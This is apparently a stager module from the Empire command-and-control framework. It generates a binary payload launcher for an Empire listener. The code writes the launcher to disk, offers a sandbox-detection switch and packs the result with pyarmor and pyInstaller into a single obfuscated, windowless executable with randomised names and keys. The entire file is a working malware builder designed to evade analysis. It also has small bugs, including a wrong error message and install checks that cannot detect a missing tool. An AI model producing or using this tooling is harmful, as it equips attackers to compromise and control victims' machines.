from __future__ import print_function

import logging
import os
import time
from builtins import object, str

log = logging.getLogger(__name__)


class Stager(object):
    def __init__(self, mainMenu, params=None):
        if params is None:
            params = []
        self.info = {
            "Name": "pyInstaller + pyArmor Launcher",
            "Authors": [
                {
                    "Name": "0xf0b05",
                    "Handle": "@none",
                    "Link": "https://nolink",
                }
            ],
            "Description": "Generates an binary payload launcher for Empire using pyInstaller.",
            "Comments": ["“Now, I am become Death, the destroyer of worlds.”"],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "ListenerBuild": {
                "Description": "Destination OS for launcher.",
                "Required": True,
                "Value": "Win",
                "SuggestedValues": ["Win", "Unix", "MacOs"],
            },
            "BinaryFile": {
                "Description": "File to output launcher to.",
                "Required": True,
                "Value": "/tmp/empire",
            },
            "SafeChecks": {
                "Description": "Switch. Checks for SandBox, exit the staging process if true. "
                               "Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "Empire",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]["Value"] = value

    def generate(self):
        # extract all of our options
        language = 'python'
        listener_build = self.options["ListenerBuild"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]
        binary_file_str = self.options["BinaryFile"]["Value"]
        import subprocess

        output_str = subprocess.check_output(["which", "pyinstaller"])
        if output_str == "":
            log.error("pyInstaller is not installed")
            log.error("Try: apt install python-pip && pip install pyinstaller")
            return ""
        output_str = subprocess.check_output(["which", "pyarmor"])
        if output_str == "":
            log.error("pyInstaller is not installed")
            log.error("Try: apt install python-pip && pip install pyarmor")
            return ""
        encode = False

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(
            listenerName=listener_name,
            language=language,
            encode=encode,
            userAgent=user_agent,
            safe_checks=safe_checks,
        )
        if launcher == "":
            log.error("Error in launcher command generation.")
            return ""

        with open(f'{binary_file_str}.py', 'w') as text_file:
            text_file.write(f"{launcher}")

        ext = '.exe' if 'win' in listener_build.lower().strip() else ''

        import secrets
        pyarm = f'pyarmor-7{ext}'
        main = f'{binary_file_str}.py'
        #ico = 'app.ico'
        xec = f'{pyarm} pack --clean --name={secrets.token_hex(8)} ' \
              f'-e " --onefile --noupx --noconsole --key {secrets.token_hex(8)} " ' \
              f'-x " --mix-str --advanced 1 " ' \
              f'{main}'

        subprocess.run(xec)

        with open(binary_file_str, "rb") as f:
            exe = f.read()

        return exe
